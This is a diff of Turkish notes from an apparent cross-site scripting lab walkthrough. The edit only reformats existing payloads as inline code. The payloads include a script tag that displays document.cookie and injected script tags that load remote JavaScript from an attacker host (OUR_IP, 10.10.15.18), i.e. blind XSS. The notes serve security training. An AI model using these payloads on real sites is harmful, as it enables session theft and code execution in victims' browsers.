@@ -50,14 +50,14 @@ alert() fonksiyonu engellendiyse hedef web sitesinde alternatif olarak kullanıl
 
 Soru 1 : Bayrağı almak için yukarıda kullandığımız aynı yükü kullanın, ancak JavaScript kodunu url'yi göstermek yerine çerezi gösterecek şekilde değiştirin.
 
-Payload :  <script>alert(document.cookie)</script>
+Payload :  `<script>alert(document.cookie)</script>`
 
 ![Pasted image 20241116005434.png](/img/user/resimler/Pasted%20image%2020241116005434.png)
 
 
 Soru : Bayrağı almak için yukarıda kullandığımız aynı payloadı kullanın, ancak JavaScript kodunu url'yi göstermek yerine cookie'i gösterecek şekilde değiştirin.
 
-Cevap : <script>alert(document.cookie)</script>
+Cevap : `<script>alert(document.cookie)</script>`
 
 ![Pasted image 20241116010911.png](/img/user/resimler/Pasted%20image%2020241116010911.png)
 
@@ -585,7 +585,7 @@ index.php dosyası :
 
 hedef'e yolladığımız payload . 
 
-"><script src=http://10.10.15.18/script.js></script><script src=http://OUR_IP:8080/script.js></script>
+`"><script src=http://10.10.15.18/script.js></script><script src=http://OUR_IP:8080/script.js></script>`
 
 ![Pasted image 20241117034627.png](/img/user/resimler/Pasted%20image%2020241117034627.png)
 
@@ -728,7 +728,7 @@ Yukarıdakilere ek olarak, iyi bir Web Uygulaması Güvenlik Duvarı'na (WAF) sa
 
 Hangi girdi'de bu istek geldi  ?  Url parametresinde kullandığımız payload sonuc verdi . 
 
-"><script src=http://OUR_IP></script>
+`"><script src=http://OUR_IP></script>`
 
 
 ![Pasted image 20241117051713.png](/img/user/resimler/Pasted%20image%2020241117051713.png)
